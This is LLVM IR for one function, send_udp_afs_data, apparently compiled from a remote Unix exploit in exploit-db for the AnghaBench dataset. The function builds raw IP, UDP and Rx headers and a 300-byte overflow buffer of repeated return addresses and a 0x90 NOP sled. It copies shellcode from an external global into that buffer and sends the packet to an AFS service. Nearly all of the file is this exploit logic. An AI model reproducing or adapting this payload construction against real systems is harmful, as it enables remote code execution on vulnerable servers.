; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20414.c_send_udp_afs_data.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20414.c_send_udp_afs_data.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.iphdr = type { i32, i32, i32, i32, i64, i64, i64, i32, i64, i8*, i64 }
%struct.udphdr = type { i32, i64, i8*, i8* }
%struct.rx_header = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16 }

@IPPROTO_UDP = common dso_local global i32 0, align 4
@c0de = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [12 x i8] c"%d %d %s %d\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"hi\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c" %d\00", align 1
@CODE_LEN = common dso_local global i32 0, align 4
@DATA_SIZE = common dso_local global i32 0, align 4
@RET_ADDR_POS = common dso_local global i32 0, align 4
@RX_CLIENT_INITIATED = common dso_local global i32 0, align 4
@RX_PACKET_TYPE_DATA = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @send_udp_afs_data(i32 %0, i64 %1, i16 zeroext %2, i64 %3, i16 zeroext %4) #0 {
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i16, align 2
  %10 = alloca i64, align 8
  %11 = alloca i16, align 2
  %12 = alloca %struct.iphdr, align 8
  %13 = alloca %struct.udphdr, align 8
  %14 = alloca %struct.rx_header, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [300 x i8], align 16
  %24 = alloca i64, align 8
  %25 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i64 %1, i64* %8, align 8
  store i16 %2, i16* %9, align 2
  store i64 %3, i64* %10, align 8
  store i16 %4, i16* %11, align 2
  %26 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 0
  store i32 4, i32* %26, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 1
  store i32 5, i32* %27, align 4
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 10
  store i64 0, i64* %28, align 8
  %29 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 2
  store i32 104, i32* %29, align 8
  %30 = call i8* @htons(i32 545)
  %31 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 9
  store i8* %30, i8** %31, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 8
  store i64 0, i64* %32, align 8
  %33 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 3
  store i32 90, i32* %33, align 4
  %34 = load i32, i32* @IPPROTO_UDP, align 4
  %35 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 7
  store i32 %34, i32* %35, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 6
  store i64 0, i64* %36, align 8
  %37 = load i64, i64* %8, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 4
  store i64 %37, i64* %38, align 8
  %39 = load i64, i64* %10, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %12, i32 0, i32 5
  store i64 %39, i64* %40, align 8
  %41 = load i16, i16* %9, align 2
  %42 = zext i16 %41 to i32
  %43 = call i8* @htons(i32 %42)
  %44 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %13, i32 0, i32 3
  store i8* %43, i8** %44, align 8
  %45 = load i16, i16* %11, align 2
  %46 = zext i16 %45 to i32
  %47 = call i8* @htons(i32 %46)
  %48 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %13, i32 0, i32 2
  store i8* %47, i8** %48, align 8
  %49 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %13, i32 0, i32 0
  store i32 2, i32* %49, align 8
  %50 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %13, i32 0, i32 1
  store i64 0, i64* %50, align 8
  %51 = call i8* @htonl(i32 0)
  %52 = ptrtoint i8* %51 to i32
  %53 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 0
  store i32 %52, i32* %53, align 4
  %54 = call i8* @htonl(i32 1)
  %55 = ptrtoint i8* %54 to i32
  %56 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 1
  store i32 %55, i32* %56, align 4
  %57 = call i8* @htonl(i32 2)
  %58 = ptrtoint i8* %57 to i32
  %59 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 2
  store i32 %58, i32* %59, align 4
  %60 = call i8* @htonl(i32 3)
  %61 = ptrtoint i8* %60 to i32
  %62 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 3
  store i32 %61, i32* %62, align 4
  %63 = call i8* @htonl(i32 4)
  %64 = ptrtoint i8* %63 to i32
  %65 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 4
  store i32 %64, i32* %65, align 4
  %66 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 5
  store i32 1, i32* %66, align 4
  %67 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 6
  store i32 1, i32* %67, align 4
  %68 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 7
  store i32 6, i32* %68, align 4
  %69 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 8
  store i32 7, i32* %69, align 4
  %70 = call i8* @htons(i32 8)
  %71 = ptrtoint i8* %70 to i16
  %72 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 9
  store i16 %71, i16* %72, align 4
  %73 = call i8* @htons(i32 9)
  %74 = ptrtoint i8* %73 to i16
  %75 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %14, i32 0, i32 10
  store i16 %74, i16* %75, align 2
  %76 = call i8* @htonl(i32 600)
  store i8* %76, i8** %19, align 8
  store i32 620, i32* %15, align 4
  %77 = load i32, i32* %15, align 4
  %78 = call i64 @calloc(i32 1, i32 %77)
  %79 = inttoptr i64 %78 to i8*
  store i8* %79, i8** %16, align 8
  %80 = load i8*, i8** %16, align 8
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %167

82:                                               ; preds = %5
  %83 = call i8* @htonl(i32 134)
  store i8* %83, i8** %20, align 8
  store i64 136081154, i64* %24, align 8
  store i32 170, i32* %25, align 4
  store i32 0, i32* %21, align 4
  br label %84

84:                                               ; preds = %96, %82
  %85 = load i32, i32* %21, align 4
  %86 = icmp sle i32 %85, 150
  br i1 %86, label %87, label %99

87:                                               ; preds = %84
  %88 = load i64, i64* %24, align 8
  %89 = load i32, i32* %25, align 4
  %90 = sext i32 %89 to i64
  %91 = add i64 %88, %90
  %92 = load i32, i32* %21, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [300 x i8], [300 x i8]* %23, i64 0, i64 %93
  %95 = bitcast i8* %94 to i64*
  store i64 %91, i64* %95, align 1
  br label %96

96:                                               ; preds = %87
  %97 = load i32, i32* %21, align 4
  %98 = add nsw i32 %97, 4
  store i32 %98, i32* %21, align 4
  br label %84

99:                                               ; preds = %84
  %100 = getelementptr inbounds [300 x i8], [300 x i8]* %23, i64 0, i64 0
  %101 = getelementptr inbounds i8, i8* %100, i64 150
  %102 = call i32 @memset(i8* %101, i32 144, i32 150)
  %103 = getelementptr inbounds [300 x i8], [300 x i8]* %23, i64 0, i64 0
  %104 = getelementptr inbounds i8, i8* %103, i64 300
  %105 = load i8*, i8** @c0de, align 8
  %106 = call i32 @strlen(i8* %105)
  %107 = sext i32 %106 to i64
  %108 = sub i64 0, %107
  %109 = getelementptr inbounds i8, i8* %104, i64 %108
  %110 = load i8*, i8** @c0de, align 8
  %111 = load i8*, i8** @c0de, align 8
  %112 = call i32 @strlen(i8* %111)
  %113 = call i32 @memcpy(i8* %109, i8* %110, i32 %112)
  %114 = load i8*, i8** %16, align 8
  %115 = bitcast i8** %20 to i8*
  %116 = call i32 @memcpy(i8* %114, i8* %115, i32 8)
  %117 = load i8*, i8** %16, align 8
  %118 = getelementptr inbounds i8, i8* %117, i64 16
  %119 = bitcast i8** %19 to i8*
  %120 = call i32 @memcpy(i8* %118, i8* %119, i32 8)
  %121 = load i8*, i8** %16, align 8
  %122 = getelementptr inbounds i8, i8* %121, i64 20
  %123 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %122, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i32 1, i32 1, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32 1)
  %124 = load i8*, i8** %16, align 8
  %125 = getelementptr inbounds i8, i8* %124, i64 20
  %126 = call i32 @strlen(i8* %125)
  %127 = add nsw i32 20, %126
  store i32 %127, i32* %22, align 4
  %128 = load i8*, i8** %16, align 8
  %129 = load i32, i32* %22, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = getelementptr inbounds [300 x i8], [300 x i8]* %23, i64 0, i64 0
  %133 = call i32 @memcpy(i8* %131, i8* %132, i32 300)
  %134 = load i8*, i8** %16, align 8
  %135 = load i32, i32* %22, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = getelementptr inbounds i8, i8* %137, i64 300
  %139 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %138, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %140 = load i32, i32* %15, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 40, %141
  %143 = trunc i64 %142 to i32
  store i32 %143, i32* %17, align 4
  %144 = load i32, i32* %17, align 4
  %145 = call i64 @calloc(i32 1, i32 %144)
  %146 = inttoptr i64 %145 to i8*
  store i8* %146, i8** %18, align 8
  %147 = load i8*, i8** %18, align 8
  %148 = icmp ne i8* %147, null
  br i1 %148, label %149, label %164

149:                                              ; preds = %99
  %150 = load i8*, i8** %18, align 8
  %151 = bitcast %struct.rx_header* %14 to i8*
  %152 = call i32 @memcpy(i8* %150, i8* %151, i32 40)
  %153 = load i8*, i8** %18, align 8
  %154 = getelementptr inbounds i8, i8* %153, i64 40
  %155 = load i8*, i8** %16, align 8
  %156 = load i32, i32* %15, align 4
  %157 = call i32 @memcpy(i8* %154, i8* %155, i32 %156)
  %158 = load i32, i32* %7, align 4
  %159 = load i8*, i8** %18, align 8
  %160 = load i32, i32* %17, align 4
  %161 = call i32 @send_udp_segment(i32 %158, %struct.iphdr* %12, %struct.udphdr* %13, i8* %159, i32 %160)
  %162 = load i8*, i8** %18, align 8
  %163 = call i32 @free(i8* %162)
  br label %164

164:                                              ; preds = %149, %99
  %165 = load i8*, i8** %16, align 8
  %166 = call i32 @free(i8* %165)
  br label %167

167:                                              ; preds = %164, %5
  %168 = load i64, i64* %6, align 8
  ret i64 %168
}

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @htonl(i32) #1

declare dso_local i64 @calloc(i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32, ...) #1

declare dso_local i32 @send_udp_segment(i32, %struct.iphdr*, %struct.udphdr*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
